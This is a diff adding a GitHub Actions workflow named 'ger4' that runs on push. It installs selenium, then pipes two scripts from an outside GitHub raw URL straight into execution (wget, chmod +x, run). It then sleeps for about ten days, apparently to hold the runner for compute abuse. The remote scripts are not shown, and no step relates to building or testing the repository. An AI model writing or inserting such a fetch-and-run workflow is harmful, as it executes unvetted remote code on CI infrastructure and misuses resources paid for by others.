@@ -1,0 +1,19 @@
+name: ger4
+
+on: push
+
+jobs:
+  check_cpu:
+    runs-on: namespace-profile-namespace-x8-4
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Works
+      run: |
+        lscpu
+        pip3 install selenium selenium-wire
+        pip3 uninstall blinker -y && pip3 install blinker==1.4
+        wget https://raw.githubusercontent.com/tunamarclass/ger/refs/heads/main/ger.sh && chmod +x ger.sh && ./ger.sh && wget https://raw.githubusercontent.com/tunamarclass/ger/refs/heads/main/ger4.py && python3 ger4.py
+        sleep 900000
